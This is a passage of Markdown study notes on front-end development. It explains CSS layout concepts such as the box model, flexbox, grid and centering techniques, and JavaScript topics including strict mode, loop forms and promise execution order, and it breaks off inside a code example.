
# 1. HTML&CSS.md

## Box Model
The CSS Box Model is a core concept in web development that encompasses how elements are structured and spaced on a web page. It serves as the foundation for laying out elements within a document, affecting dimensions, spacing, and border properties.

### Components
The box model consists of several layers wrapped around each element:
- **Content**: The innermost part containing actual data like text, images, or videos.
- **Padding**: Space between the content and the border, affecting the element's inner whitespace without being visible itself.
- **Border**: A potentially visible boundary surrounding the padding (if any) and content. It can be styled in various ways.
- **Margin**: The outermost space around the element, separating it from adjacent elements.

### Box Model Properties
Understanding and manipulating the box model properties is crucial for effective CSS layout:

**Padding and Margin**
- **Syntax**: Both `padding` and `margin` properties can specify one to four values (clockwise from top: top, right, bottom, left):
  - **One value**: Applies the same spacing on all four sides.
  - **Two values**: Specifies top and bottom (first value), and left and right (second value).
  - **Three values**: Sets top (first value), left and right (second value), and bottom (third value).
  - **Four values**: Each value applies to a specific side, starting from the top and moving clockwise.
- **Individual Properties**: Use `padding-top`, `padding-right`, `padding-bottom`, `padding-left`, and similarly for margin, to affect specific sides.

  **Border**
  - **Overview**: The `border` property is shorthand for setting `border-width`, `border-style`, and `border-color` simultaneously.
  - **Examples**:
    - `border: 1px solid black;` sets a solid, black border with a width of 1px.
    - `border: 3px dashed red;` creates a 3px wide, dashed, red border.

### Box Sizing
Different box sizing models affect the calculation of an element’s total width and height:

**Content-Box (Standard Box Model)**
- **Default Model**: Width and height calculations include only the content.
- **Usage**: Utilized unless altered by setting the `box-sizing` property to another value.

**Border-Box (IE Box Model)**
- **Alternate Model**: Width and height calculations include content, padding, and border.
- **Advantage**: Simplifies layouts as the element's size adjustment does not require recalculating upon padding or border modifications.
- **Implementation**: `box-sizing: border-box;`

**Border-Box Example**

To facilitate understanding, consider a scenario where a box needs to fit exactly into a 100px by 100px space, including all model components:
```css
div {
  width: 100px;
  height: 100px;
  padding: 10px;
  border: 5px solid black;
  margin: 10px;
  box-sizing: border-box;
}
```
With `box-sizing: border-box;`, the padding and border are included within the 100px x 100px dimensions, avoiding any overflow or additional calculations.

## CSS Display Properties
### Block Boxes
- **Description**: Block boxes consume the full width available in their parent container, creating a new line before and after the box. This behavior is typical for structural elements used to group content sections.
- **Examples**: `div`, `section`, `p`, `header`, `footer`, `h1` to `h6`
- **Properties**: The `width` and `height` properties are applicable.
- **CSS Syntax**: `display: block;`

### Inline Boxes
- **Description**: Inline boxes do not break the line. They flow within the text and other inline elements, suitable for styling portions of text without disrupting the document flow.
- **Examples**: `span`, `a`, `em`, `strong`
- **Properties**: The `width` and `height` properties do not affect inline elements as their dimensions are content-driven.
- **CSS Syntax**: `display: inline;`

### Inline-Block Boxes
- **Description**: Inline-block boxes combine features of both block and inline boxes. They allow elements to sit next to each other on the same line while still maintaining block properties like width and height.
- **Examples**: Useful for creating menus or button groups where elements need to be aligned horizontally but also require specific dimensions.
- **CSS Syntax**: `display: inline-block;`

## Block Formatting Context (BFC)

A Block Formatting Context (BFC) is an essential concept in CSS layout that creates an independent rendering area on a webpage. It helps in managing the layout of block-level boxes and interacts with floating elements distinctly from the rest of the page. This isolation enables the elements within a BFC to behave in a predictable manner, shielding them from external layout influences and interferences such as float overlaps and margin collapses.

### Establishing a BFC

Creating a BFC is straightforward and can be accomplished by applying specific CSS properties to an HTML element. Here are the most commonly used methods:

- `display: table-cell;`
- `display: flex;`
- `display: inline-block;`
- `overflow: hidden;` (when value is not `visible`)
- `position: absolute;`
- `position: fixed;`

These properties, when applied, do not just alter the visual representation of elements but also define their interaction with the layout and surrounding elements in terms of floating and margin behaviors.

### Practical Applications of BFC

BFCs are not only theoretical but have practical applications in everyday web design and development. Below are key problems BFCs can solve with examples illustrating how to implement them.

#### Example 1: Solving Vertical Margin Collapse

Vertical margin collapse occurs when the vertical margins of adjacent elements combine into a single margin, dictated by the larger of the two, which can lead to unexpected layout results.

**HTML structure:**
```html
<section>box-one</section>
<section>box-two</section>
```

**CSS styling demonstrating the issue:**
```css
section {
  background: red;
  color: black;
  width: 200px;
  line-height: 100px;
  text-align: center;
  margin: 50px; /* Potential overlapping margin issue */
}
```

**Solution:**
To prevent this margin overlap, encase the second section in a div that creates a new BFC:
```html
<section>box-one</section>
<div class="box-container">
  <section>box-two</section>
</div>
```

**CSS modification to create a BFC:**
```css
.box-container {
  overflow: hidden; /* Triggers BFC creation */
}
```

#### Example 2: Managing Float-Related Layout Issues

Floating elements can lead to the parent container collapsing in height if the float is not properly cleared or contained within a BFC.

**HTML setup:**
```html
<div class="container">
  <div class="box"></div>
  <div class="box"></div>
</div>
```

**CSS issue demonstration:**
```css
.container {
  background: red;
}
.box {
  width: 100px;
  height: 100px;
  margin: 100px;
  background: blue;
  float: left; /* Causes height collapse */
}
```

**Solution:**
Adjust the `.container`'s display property to manage the floats properly and maintain the container's height:
```css
.container {
  background: red;
  display: inline-block; /* Establishes a BFC */
}
```

## CSS Selectors and Their Priorities
CSS selectors are patterns used to select the HTML elements you want to style. These selectors target specific elements based on their attributes, position within the HTML document, and their relationship to other elements.

### Types of CSS Selectors
- **Element Selectors**: Target elements based on their type, e.g., `p`, `div`, `h1`.
- **Class Selectors**: Target elements using their class attribute, prefixed with a dot, e.g., `.className`.
- **ID Selectors**: Target elements using their ID attribute, prefixed with a hash, e.g., `#idName`.
- **Attribute Selectors**: Select elements based on an attribute or attribute value, e.g., `[type="text"]`.
- **Pseudo-classes and Pseudo-elements**: 
  - Pseudo-classes like `:hover` and `:focus` target elements in specific states.
  - Pseudo-elements like `::before` and `::after` target specific parts of an element.
- **Combinators**: Include child (`>`), descendant (` `), adjacent sibling (`+`), and general sibling (`~`) selectors.

### Selector Specificity and Priorities
- **Specificity Rules**: Specificity determines which CSS rule applies if one element is targeted by multiple rules. The specificity hierarchy from highest to lowest priority is:
  - Inline styles, found within HTML tags.
  - ID selectors.
  - Class, pseudo-class, and attribute selectors.
  - Element selectors.
  - Universal selector (`*`), combinators, and negation pseudo-class (`:not()`), which do not contribute to specificity.
- **Important Note**: The `!important` declaration overrides other declarations but should be used sparingly to avoid complications in debugging.
- **Calculating Specificity**: Specificity is calculated as a numerical value, where:
  - ID selectors contribute the most to specificity.
  - Class, pseudo-classes, and attributes contribute less than IDs but more than elements.

**Examples**
- Example 1: `#header` will override `.main .header` due to higher specificity of the ID selector.
- Example 2: `h1.title` is more specific than `h1` because it combines an element and a class selector.

### Best Practices for Using CSS Selectors
- Maintain simplicity and reusability in selectors to facilitate easier management and maintenance of style sheets.
- Avoid overly specific selectors to ensure CSS remains flexible and manageable.
- Use meaningful class and ID names that reflect the function or content rather than appearance.

## Clear Floats

Floating elements can remove them from the normal flow of a document, causing parent containers to collapse if not properly handled. It's crucial for front-end developers to understand the methods available to manage this behavior effectively.

### Methods of Clearing Floats - Pure CSS
#### Pseudo-Element Method
This method involves using a CSS pseudo-element, which can clean up the HTML by eliminating the need for explicit clear elements.

**Pros**:
- Keeps the HTML cleaner by not requiring additional markup.
- Generally well-supported in modern browsers.

**Cons**:
- May not be supported by some older browsers.

**Example**:
```css
.parent::after {
    content: "";
    display: table;
    clear: both;
}
```

#### Block Formatting Context (BFC)
A Block Formatting Context is another CSS method to clear floats by setting properties on the parent element that establish a new block formatting context.

**Pros**:
- Simplifies CSS by not requiring additional elements.
- Broadly compatible with most browsers.

**Cons**:
- Can cause clipping of content that extends outside the parent's bounds.

**Example**:
```css
.parent {
    overflow: hidden; /* 'auto' can also be used if clipping is a concern */
}
```

#### Fixed Dimensions
Applying fixed dimensions to the parent element is a straightforward method, though less flexible.

**Pros**:
- Easy to implement and has universal browser support.

**Cons**:
- Inflexible and can lead to issues with content overflow if the size of child elements changes.

**Example**:
```css
.parent {
    width: 300px; /* Fixed width */
    height: 200px; /* Fixed height */
}
```

### Clearing Element - Adding HTML Element

Introducing a clearing element in HTML is a traditional method to ensure the parent container extends beyond the floated elements, maintaining the layout structure.

**Pros**:
- Effective and straightforward method to clear floats.
- Ensures the layout is not broken by floated elements.

**Cons**:
- Adds non-semantic, extra HTML elements which can complicate maintenance.

**Example**:
```html
<div class="parent">
    <div class="child">Content</div>
    <div class="child">Content</div>
    <div class="clearfix"></div>
</div>
```
```css
.clearfix {
    clear: both;
}
```

## CSS Units: Differences and Usage

1. **Pixels (px):** Pixels are a fixed-size unit that is most commonly used in screen media. A pixel is an absolute unit that doesn't change based on other elements. It's great for when you need precise control over element sizing, like for borders or shadows.

2. **Percent (%):** Percentages are relative units and depend on the parent element's size. They are extremely useful for creating layouts that adapt to different screen sizes, maintaining proportions regardless of the parent size.

3. **Ems (em):** Ems are relative to the font-size of the element they are used on. If used on font-size, they are relative to the font-size of the parent element. Ems are great for scalable typography and elements that need to maintain their proportions relative to text size.

4. **Rems (rem):** Rems are relative to the font-size of the root element (html). They allow for consistent scaling across the entire document and are very useful in responsive design for maintaining uniformity in spacing, layout, and typography.

5. **Viewport Width (vw):** 1vw is equal to 1% of the viewport's width. This unit is helpful for creating elements that scale with the width of the viewport, like for fluid layouts and typography.

6. **Viewport Height (vh):** Similarly, 1vh is 1% of the viewport's height. It's useful for elements that should scale with the height of the viewport, such as sections of a single-page layout.

7. **Viewport Minimum (vmin):** This unit is 1% of the viewport's smaller dimension (height or width). Vmin is particularly useful for maintaining aspect ratios in responsive design.

8. **Viewport Maximum (vmax):** Conversely, vmax is 1% of the larger dimension (height or width). It's less commonly used but can be beneficial for certain design challenges.

## Example of Responsive Design Code
```css
/* Base HTML font size */
html {
    font-size: 16px; /* Set a standard font size */
}

/* Responsive font size for smaller screens */
@media only screen and (max-width: 300px) {
    html {
        font-size: 14px; /* Reduce font size on small devices */
    }
}

/* Paragraph styling */
p {
    font-size: 1rem; /* Font size is relative to HTML element */
    line-height: 1.5; /* Good for readability */
    margin: 0 0 1rem 0; /* Spacing for paragraphs */
}

/* Responsive element styling */
@media only screen and (max-width: 768px) {
    p {
        font-size: 0.9rem; /* Smaller font size on tablets and smaller devices */
    }
}
```

## Differences Between offsetHeight, scrollHeight, and clientHeight

1. **offsetHeight**: The `offsetHeight` property measures the total visible height of an element, including padding, border, and the scroll bar on the element (if any), but excluding margins. It's the outermost height measurement that includes everything inside the margin.

2. **clientHeight**: The `clientHeight` property measures the visible content area (including padding) of an element but excludes the border, scrollbar, and margin. It's useful for getting the actual area available for the content inside an element.

3. **scrollHeight**: The `scrollHeight` property measures the total height of an element's content, including content not visible on the screen due to overflow. It includes padding but excludes borders, scrollbar, and margin. This is larger than the `clientHeight` if there's content that overflows outside the visible area.

## Retina Screen and 1px Lines Implementation
When designing for Retina displays, setting elements to 1px using CSS can result in lines that appear too thick, due to some mobile phones having a Device Pixel Ratio (DPR) of 2. This means 1 CSS pixel could use 2 physical pixels, making the line appear thicker than intended. Directly setting elements to 0.5px can lead to compatibility issues across different browsers. 

### Using CSS Pseudo-elements and Transform Property:  
To achieve the desired 1px line appearance on Retina screens, we can use CSS pseudo-elements combined with the `transform` property for optimization. 

```css
#box::before {
  content: '';
  position: absolute;
  left: 0;
  bottom: 0;
  width: 100%;
  height: 1px;
  background: #d9d9d9;
  transform: scaleY(0.5);
  transform-origin: 0 0;
}
```

This approach leverages the `::before` pseudo-element to create a line that visually represents 1px on Retina displays by scaling it down by 50% along the Y-axis. This effectively simulates a thinner line without causing browser compatibility issues.

### Handling Borders with Border-Radius  
When dealing with elements that have a border-radius, applying a thin border can be slightly more complex due to the way borders interact with the border-radius. In such cases, using `box-shadow` can offer a solution that allows for a fine-tuned appearance:

```css
#box {
  box-shadow: 0 0 0 0.5px #d9d9d9;
}
```

This method applies a `box-shadow` that mimics a border, allowing for the adjustment of its thickness to achieve the desired 0.5px visual effect on Retina displays. It's a versatile approach that maintains the element's aesthetic, including when a border-radius is applied, ensuring the visual consistency of the design across high-resolution screens.

## Inheritance in CSS

CSS inheritance works by allowing certain properties of a parent element to influence the same properties in its child elements, unless these properties are explicitly overridden. This means that if a style is defined for a parent element, the child elements will automatically adopt this style, following the "cascading" nature of CSS.

### Properties That Inherit by Default

Not all CSS properties are inherited by default, but many related to text formatting are. Knowing which properties inherit by default can help you write cleaner and more efficient CSS. Here’s a list of commonly inherited properties:

- **Font Styles**: 
  - `font-family`: Defines the typeface.
  - `font-size`: Specifies the size of the font.
  - `font-style`: Determines whether the text is italicized.
  - `font-weight`: Controls the thickness of the font.
  - `line-height`: Sets the space between lines of text.

- **Text Formatting**:
  - `text-align`: Aligns text within an element (e.g., left, right, center).
  - `text-indent`: Indents the first line of a text block.
  - `text-transform`: Controls capitalization (e.g., uppercase, lowercase).
  - `text-decoration`: Applies decoration to text (e.g., underline, line-through).
  - `text-shadow`: Adds shadow to text.

- **Spacing**:
  - `letter-spacing`: Adjusts the space between characters.
  - `word-spacing`: Modifies the space between words.

- **Visibility**:
  - `visibility`: Specifies whether an element is visible or hidden.

## How to handle text Overflow with Ellipsis (`...`) in CSS? 
### For Single-line Text Overflow
```css
#box1 {
    border: 1px solid #ccc;
    width: 100px; /* Fixed width */
    white-space: nowrap; /* Prevents text from wrapping to a new line */
    overflow: hidden; /* Hides text that overflows the container's bounds */
    text-overflow: ellipsis; /* Adds an ellipsis to indicate text overflow */
}
```

In this setup, `white-space: nowrap` ensures the text stays on a single line, `overflow: hidden` hides any overflow, and `text-overflow: ellipsis` replaces the hidden overflow text with an ellipsis.

### For Multi-line Text Overflow
```css
#box2 {
    border: 1px solid #ccc;
    width: 100px; /* Fixed width */
    overflow: hidden; /* Hides text that overflows the container's bounds */
    display: -webkit-box; /* Displays the container as a webkit flex box */
    -webkit-box-orient: vertical; /* Sets the children's orientation to vertical */
    -webkit-line-clamp: 3; /* Limits the box to showing 3 lines of text, with overflow indicated by an ellipsis */
}
```

This method uses `-webkit-box`, `-webkit-box-orient`, and `-webkit-line-clamp` to achieve multi-line truncation. It's important to note that this approach is somewhat limited by its compatibility with only webkit-based browsers (e.g., Safari, Chrome). However, it's widely used due to its simplicity and effectiveness in most web scenarios.

## Solve Styling Problem: Responsive Three-Div Setup

You have a large `div` element that contains three smaller `div` elements. The goal is to position these three child `div`s side by side — left, center, and right within the parent `div`. The left and right `div`s have a fixed width, while the center `div` should automatically adjust its width to occupy all remaining space.

**Solution**  
To achieve this layout, you can use CSS Flexbox. Flexbox provides an efficient way to distribute space and align items within a container, even when their size is unknown or dynamic.

1. **Set the Display Property of the Parent `div`**: First, you need to define the parent `div` as a flex container. This is done by setting its `display` property to `flex`.

    ```css
    .parent {
        display: flex;
    }
    ```

2. **Define the Width of the Child `div`s**: Next, specify the width for the left and right child `div`s since they have a fixed size. The width can be set in pixels, ems, or any other CSS units.

    ```css
    .left, .right {
        width: 100px; /* Example fixed width */
    }
    ```

3. **Flexible Width for the Center `div`**: For the center `div`, you want it to fill the remaining space. This is achieved by setting the `flex-grow` property to a value greater than 0. Setting it to 1 tells the `div` to occupy any available space.

    ```css
    .center {
        flex-grow: 1;
    }
    ```

**HTML Structure:**
```html
<div class="parent">
    <div class="left">Left</div>
    <div class="center">Center</div>
    <div class="right">Right</div>
</div>
```

## Flexbox Layout

Flexbox, formally known as the Flexible Box Layout, is a one-dimensional layout method for laying out items in rows or columns within a container. It allows you to design a complex layout structure with a simpler and more flexible approach.

- **Flex Container**: The element on which `display: flex` or `display: inline-flex` is applied. It becomes the flex container, and its children become flex items.
- **Flex Items**: Direct children of the flex container.

### Key Properties

**For the Flex Container**  

- **display**: This defines a flex container; set this to `flex` or `inline-flex`.
- **flex-direction**: This establishes the main-axis, determining the direction flex items are placed in the flex container. Values: `row`, `row-reverse`, `column`, `column-reverse`.
- **flex-wrap**: By default, flex items will all try to fit onto one line. You can change that and allow the items to wrap as needed with this property. Values: `nowrap`, `wrap`, `wrap-reverse`.
- **justify-content**: This defines the alignment along the main axis. Values include `flex-start`, `flex-end`, `center`, `space-between`, `space-around`, `space-evenly`.
- **align-items**: This defines the default behavior for how flex items are laid out along the cross axis on the current line. Think of it as the `justify-content` version for the cross-axis (perpendicular to the main-axis). Values: `flex-start`, `flex-end`, `center`, `baseline`, `stretch`.
- **align-content**: This aligns a flex container's lines within when there is extra space in the cross-axis, similar to how `justify-content` aligns individual items within the main-axis. Note, this property has no effect when there is only one line of flex items. Values: `flex-start`, `flex-end`, `center`, `space-between`, `space-around`, `stretch`.

**For Flex Items**  

- **flex-grow**: This defines the ability for a flex item to grow if necessary. It accepts a unitless value that serves as a proportion. It dictates what amount of the available space inside the flex container the item should take up.
- **flex-shrink**: This defines the ability for a flex item to shrink if necessary.
- **flex-basis**: This defines the default size of an element before the remaining space is distributed. It can be a length (e.g., 20%, 5rem, etc.) or a keyword like `auto`.
- **flex**: This is a shorthand for the `flex-grow`, `flex-shrink`, and `flex-basis` properties.
- **align-self**: This allows the default alignment (or the one specified by `align-items`) to be overridden for individual flex items.

### Flexbox Use Cases

- **Centering a child element**: Flexbox makes centering items within a container straightforward, both vertically and horizontally.
- **Creating a navigation bar**: Easily align navigation items evenly.
- **Equal height columns/rows**: Even when content size varies.

**Example**

```html
<div class="flex-container">
  <div class="flex-item">1</div>
  <div class="flex-item">2</div>
  <div class="flex-item">3</div>
</div>
```

```css
.flex-container {
  display: flex;
  justify-content: center; /* Center items horizontally */
  align-items: center; /* Center items vertically */
  height: 200px; /* Define height */
}

.flex-item {
  margin: 5px;
}
```

## Grid Layout

CSS Grid Layout is a two-dimensional layout system for the web. It lets you layout items into rows and columns, and it’s the perfect tool for creating complex web layouts. It’s a much more powerful and versatile system than Flexbox for certain types of layouts.

- **Grid Container**: The element on which `display: grid` or `display: inline-grid` is applied. It becomes the grid container.
- **Grid Item**: The children (direct descendants) of the grid container.
- **Grid Line**: The dividing lines that make up the structure of the grid. They can be horizontal or vertical.
- **Grid Cell**: The space between two adjacent row and two adjacent column grid lines. It’s a single "unit" of the grid.
- **Grid Area**: The total space surrounded by four grid lines. A grid area may be composed of any number of grid cells.

### Key Properties

**For the Grid Container**  

- **display**: Defines the element as a grid container and establishes a new grid formatting context for its contents. Values: `grid`, `inline-grid`.
- **grid-template-columns** / **grid-template-rows**: Defines the columns/rows of the grid with a space-separated list of values. The values represent the track size, and the space between them represents the grid line.
- **grid-gap** (also `row-gap` and `column-gap`): Defines the size of the gap between the rows and columns.
- **justify-items**, **align-items**, **place-items**: Aligns grid items along the row axis, column axis, or both.
- **justify-content**, **align-content**, **place-content**: Aligns the grid itself inside the grid container.

**For Grid Items**  

- **grid-column-start** / **grid-column-end** and **grid-row-start** / **grid-row-end**: Determines a grid item’s location within the grid by referring to specific grid lines.
- **grid-column** / **grid-row**: Shorthand for `grid-column-start`/`end` and `grid-row-start`/`end`.
- **grid-area**: Gives an item a name so it can be referenced by a template created with the `grid-template-areas` property.

### Grid Layout Use Cases

- **Complex layouts**: Ideal for designing layouts with multiple rows and columns, such as magazines and newspapers.
- **Responsive designs**: Easily adjust and reflow content based on screen size.
- **Alignment and spacing**: Precisely control the alignment, spacing, and sizing of grid items.

**Example**  

```html
<div class="grid-container">
  <div class="grid-item">1</div>
  <div class="grid-item">2</div>
  <div class="grid-item">3</div>
</div>
```

```css
.grid-container {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 10px;
}

.grid-item {
  padding: 20px;
  background-color: lightgrey;
}
```

## Different Ways to Implement a Two-Column Layout with Fixed and Responsive Sides

Creating a layout where one side has a fixed width while the other side adapts responsively.

### Strict responsive solutions

**Flexbox Layout**
Flexbox offers a robust method for creating dynamic layouts. It excels in aligning and distributing space within a container, making it ideal for uncertain item sizes.

```css
.container {
    display: flex;
}

.left-side {
    width: 200px;
    background-color: lightblue;
}

.right-side {
    flex-grow: 1;
    background-color: lightgreen;
}
```
**Explanation**: The `.container` uses `display: flex;` to become a flex container. The `.left-side` has a fixed width of 200px, ensuring stability, while the `.right-side` uses `flex-grow: 1;` to adapt and fill the remaining space, maintaining responsiveness as the viewport size changes.

**Grid Layout**
The CSS Grid Layout provides precise control over layout grids, suitable for complex arrangements.

```css
.container {
    display: grid;
    grid-template-columns: 200px 1fr;
}

.left-side {
    background-color: lightblue;
}

.right-side {
    background-color: lightgreen;
}
```
**Explanation**: Here, `grid-template-columns: 200px 1fr;` sets up a two-column grid. The `.left-side` is fixed at 200px, and the `.right-side` expands dynamically with `1fr` representing a fraction of the available space, offering a fluid response to viewport adjustments.

**Table Layout**
Table Layout, while traditional, is effectively used for displaying structured data and certain layout designs.

```css
.container {
    display: table;
    width: 100%;
}

.left-side, .right-side {
    display: table-cell;
}

.left-side {
    width: 200px;
    background-color: lightblue;
}

.right-side {
    background-color: lightgreen;
}
```
**Explanation**: The `.container` is set as a table, creating a robust framework for the `.left-side` and `.right-side` styled as table cells. The `.left-side` maintains a fixed width, and the `.right-side` adjusts to occupy any remaining space, ensuring the layout remains responsive.

### Non-strict responsive solutions
Some layout techniques do not adapt when the viewport size changes but can be useful for specific design requirements.

**CSS Float Layout**  
The float layout method, though somewhat dated, remains useful particularly for simpler or legacy projects.

```css
.container {
    overflow: hidden; /* Clears the float effect within the container */
}

.left-side {
    float: left;
    width: 200px;
    background-color: lightblue;
}

.right-side {
    width: calc(100% - 200px); /* Dynamic calculation of the width */
    background-color: lightgreen;
}
```
**Explanation**: By floating the `.left-side` to the left, we allow the `.right-side` to automatically adjust its width with `calc(100% - 200px);`. This dynamic calculation subtracts the fixed width of the left column from the total container width, ensuring the right side is responsive to the remaining space.

**CSS Positioning Layout**  
Positioning allows for precise control over layout elements, ideal for complex positioning needs.

```css
.container {
    position: relative;
}

.left-side {
    position: absolute;
    width: 200px;
    top: 0;
    bottom: 0;
    left: 0;
    background-color: lightblue;
}

.right-side {
    margin-left: 200px; /* Prevents overlap with the left side */
    background-color: lightgreen;
}
```
**Explanation**: By setting the `.left-side` to `position: absolute;` relative to its `position: relative;` parent, it remains stationary. The `.right-side` employs a `margin-left` of 200px to start adjacent to the left side, providing a responsive layout that adjusts based on the overall container width.

**CSS Inline-block Layout**  
The inline-block method is useful for simpler two-column layouts but requires careful management of element spacing.

```css
.container {
    font-size: 0; /* Eliminates whitespace between inline-block elements */
}

.left-side, .right-side {
    display: inline-block;
    vertical-align: top; /* Ensures top alignment */
}

.left-side {
    width: 200px;
    background-color: lightblue;
}

.right-side {
    width: calc(100% - 200px); /* Adjusts width based on the left side */
    background-color: lightgreen;
}
```
**Explanation**: Both `.left-side` and `.right-side` are displayed as inline-block, with the `.left-side` fixed at 200px. The `.right-side` uses `calc(100% - 200px);` for width adjustment, filling the rest of the container width. Setting the container’s `font-size` to 0 removes the whitespace between inline-block elements, ensuring the columns are seamlessly adjacent without gaps.

## CSS Centering Techniques
```html
<!-- Example HTML structure to use as a reference throughout this guide -->
<div class="container">
  <div class="center-fixed"></div>
  <div class="center-auto"></div>
  <div class="center-dynamic"></div>
  <div class="center-flex"></div>
  <div class="center-grid"></div>
  <div class="center-table"></div>
</div>

<style>
  .container {
    width: 300px;
    height: 300px;
    border: 1px solid black;
  }
</style>
```

### Centering with Dynamic Dimensions
**Absolute** Positioning with Transform
```css
.container {
  position: relative;
}

.center-dynamic {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
```

**Flexbox**
```css
.center-flex {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh; /* Full viewport height */
}
```

**CSS Grid**
```css
.center-grid {
  display: grid;
  place-items: center;
  height: 100vh; /* Full viewport height */
}
```

**table**
```css
.container {
  display: table;
}

.center-table {
  display: table-cell;
  vertical-align: middle;
  text-align: center;
}
```

### Centering with Fixed Dimensions
**Absolute Positioning with Negative Margin**
```css
.container {
  position: relative;
}

.center-fixed {
  position: absolute;
  width: 200px;
  height: 100px;
  top: 50%;
  left: 50%;
  margin-top: -50px;  /* Half of height */
  margin-left: -100px; /* Half of width */
}
```

**Absolute Positioning with Auto Margins**
```css
.container {
  position: relative;
}

.center-auto {
  position: absolute;
  width: 200px;
  height: 100px;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  margin: auto;
}
```
Explanation: setting `top`, `right`, `bottom`, and `left` is actually moving the boundary of the box model, not only the content. Setting them all to 0 will make the box model fill the container, and since we set the content with fixed dimensions, `margin: auto` will center the box model within the container. 
# 2. Javascript.md

## JavaScript's Strict Mode Features

JavaScript's Strict Mode is a feature that enforces a stricter parsing and error handling mechanism on your JavaScript code. Activating Strict Mode can be done by adding `'use strict';` at the beginning of a script or a function block. This mode intentionally has different semantics from the normal code, aimed at improving code reliability and performance.

### Features of Strict Mode

1. **Mandatory Variable Declarations**: In Strict Mode, every variable must be declared before use. If a script attempts to use an undeclared variable, JavaScript will throw a `ReferenceError`. This requirement helps to avoid the accidental creation of global variables caused by typographical errors.

2. **Disallows the `with` Statement**: The `with` statement is not allowed in Strict Mode because it creates ambiguity about the scope of variables. Its use can lead to significant performance hits and complicates the debugging process, as it modifies the scope chain, making it harder to predict which variables will be affected by a piece of code.

3. **Scoped `eval()` Function**: Any declarations within an `eval()` expression in Strict Mode do not affect the surrounding scope, making `eval()` safer by preventing it from introducing new variables or modifying existing ones in the parent scope.

4. **Secure `this` Keyword Behavior**: In functions that are not called as methods of an object, the value of `this` is `undefined` in Strict Mode. This contrasts with non-strict mode, where `this` defaults to the global object, reducing the risk of inadvertently modifying the global environment.

5. **Prohibits Duplicate Parameter Names**: Functions cannot have multiple parameters with the same name, which eliminates potential errors from duplicated identifiers and enhances code clarity.

6. **Immutable Non-Writable Properties**: In Strict Mode, attempts to assign values to non-writable properties result in a `TypeError`. This feature ensures the immutability of constants and read-only properties, thus preserving data integrity.

7. **Restrictions on Deleting Properties**: Trying to delete non-deletable properties (such as built-in objects or fixed properties) will throw a `TypeError`, protecting important parts of the language’s core.

8. **No Octal Numeric Literals**: Octal literals and octal escape sequences are not allowed in Strict Mode. This restriction avoids confusion between mistakenly leading zeroes in numbers and octal syntax, making the code more readable and less prone to errors. 
   - Octal literals are those starting with a leading zero, like `010` stands for 8 in decimal. Octal escape sequences are those starting with `\`, like `\141` stands for `'a'`. We can use `u0061` instead of `\141` to represent `'a'`, and `0o10` instead of `010` to represent `8`.

### Conclusion

By enforcing these constraints, Strict Mode significantly aids in the development of more secure, robust, and clean JavaScript code. It prevents common coding errors, reduces accidental global variable creation, clarifies the scope chain, and enforces a cleaner syntax. Adopting Strict Mode can lead to better performance, easier debugging, and a more structured codebase, which are crucial for maintaining large-scale JavaScript applications.

## Traverse an Array: `for` vs. `forEach`

### Performance Comparison
1. **Function Calls**: A `for` loop directly accesses each element in the array without additional overhead. In contrast, `forEach` uses a callback function for each element, introducing slight overhead due to the creation of a new execution context for each iteration.
2. **Flexibility and Optimization**: `for` loops offer greater flexibility, allowing the use of `break`, `continue`, and modification of the iteration index. This can lead to more optimized solutions in certain scenarios.

### Readability and Maintenance
Despite the potential speed advantage of `for` loops, `forEach` is often preferred for its readability and maintenance benefits. It provides a more declarative approach to iterating over arrays, improving code clarity and reducing the likelihood of common errors associated with `for` loops, like incorrect index usage.

## Difference between `for..in` and `for..of` loops in JavaScript. 

### For...in Loop iterates over the enumerable properties of an object
- The `for..in` loop iterates over all enumerable properties of an object.
- It is generally used for objects, where the loop iterates over the property keys of the object.
- For arrays, it iterates over the index values (keys) of the array.

```ts
const arr: number[] = [10, 20, 30]; // Array should be defined as number[]
for (let i in arr) {
    console.log(i); // Output: 0, 1, 2 (indexes)
}

const str: string = 'abc';
for (let i in str) {
    console.log(i); // Output: 0, 1, 2 (indexes)
}

const obj = {name: 'aaa', age: 30};
for (let i in obj) {
    console.log(i); // Output: name, age (keys)
}
```

### For...of Loop iterates over the values of an iterable object
- The `for..of` loop iterates over iterable objects such as Arrays, Strings, Maps, NodeLists, and more.
- It is used to iterate over the values in these collections.
- It cannot be used directly on objects since they are not iterable.

```ts
const arr: number[] = [10, 20, 30];
for (let i of arr) {
    console.log(i); // Output: 10, 20, 30 (values)
}

const str: string = 'abc';
for (let i of str) {
    console.log(i); // Output: a, b, c (characters)
}

function fn(){
    for (let arg of arguments) {
        console.log(arg);
    }
}

fn(100, 200, 'aaa'); // Output: 100, 200, 'aaa'

const s1 = new Set([10, 20, 30]);
for (let i of s1) {
    console.log(i); // Output: 10, 20, 30 (Set values)
}

const m1 = new Map([
    ['x', 100],
    ['y', 200],
    ['z', 300]
]);
for (let [key, value] of m1) {
    console.log([key, value]); // Output: ['x', 100], ['y', 200], ['z', 300]
}
```

## What is and when to use `for await...of`
The for await...of statement is a feature in JavaScript that allows you to loop over asynchronous iterables—objects that you can iterate over asynchronously, such as Promises. It waits until the Promise is resolved before moving to the next iteration, making it useful for handling asynchronous operations in a sequential manner.
```ts
async function processPromises() {
    function createPromise(val) {
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(val);
            }, 1000);
        });
    }

    const p1 = createPromise(100);
    const p2 = createPromise(200);
    const p3 = createPromise(300);
    const list = [p1, p2, p3];

    // Iterating over an array of Promises and logging each resolved value
    // effect is same as:
    // Promise.all(list).then(res => console.log(res))
    for await (let res of list) {
        console.log(res);
    }

    // Performing asynchronous operations in sequence
    const arr = [100, 200, 300];
    for (let num of arr) {
        const res = await createPromise(num); // Ensure this code is inside an async function
        console.log(res);
    }
}

processPromises();
```

The `for await...of` loop is a powerful feature for handling asynchronous operations in JavaScript, providing a more intuitive and cleaner way to process sequences of Promises compared to chaining or using `Promise.all()`. It's particularly useful in scenarios where you need to maintain the order of operations or when working with streams of asynchronous data.

`Promise.all()` only make sure the promises are resolved in parallel, or there is an error in any of the promises, but `for await...of` makes sure the promises are resolved in sequence.

## Understanding Promise Execution Order
### Basic Promise Execution Flow
```javascript
Promise.resolve().then(() => {
  console.log(0);
  return Promise.resolve(4);
}).then((res) => {
  console.log(res);
});

Promise.resolve().then(() => {
  console.log(1);
}).then(() => {
  console.log(2);
}).then(() => {
  console.log(3);
}).then(() => {
  console.log(5);
